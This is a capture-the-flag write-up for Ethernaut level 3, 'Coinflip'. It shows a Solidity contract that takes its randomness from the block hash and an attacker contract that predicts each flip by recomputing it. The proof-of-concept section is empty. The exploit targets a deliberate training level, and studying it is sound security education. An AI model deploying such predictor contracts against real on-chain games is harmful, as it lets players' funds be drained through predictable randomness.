# Ethernaut: 3. Coinflip

> This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

**Objective of CTF:**

- Guess the correct outcome 10 times in a row.

**Target contract:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract CoinFlip {
  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

## The Attack

In this attack, we will guess the supposed "random" flips by calling the attack from our contracts. The target contract is programmed to flip a coin on each block, so each guess we make must be on different blocks.

We can simply copy and paste their `flip` function in our contract, and then call their actual `flip` function based on the result. Here is our attacking contract with a `psychicFlip` function that always guesses correctly:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol";

// interface for target
interface CoinFlip {
  function flip(bool _guess) external returns (bool);
}

contract Attacker {
  CoinFlip coinflipTarget;
  using SafeMath for uint256;

  constructor(address _target) {
    coinflipTarget = CoinFlip(_target);
  }

  function psychicFlip() public {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    uint256 coinFlip = blockValue.div(57896044618658097711785492504343953926634992332820282019728792003956564819968);
    bool side = coinFlip == 1 ? true : false;

    bool result = coinflipTarget.flip(side);
    require(result, "Could not guess, abort mission.");
  }
}
```

That is pretty much it!

## Proof of Concept

...
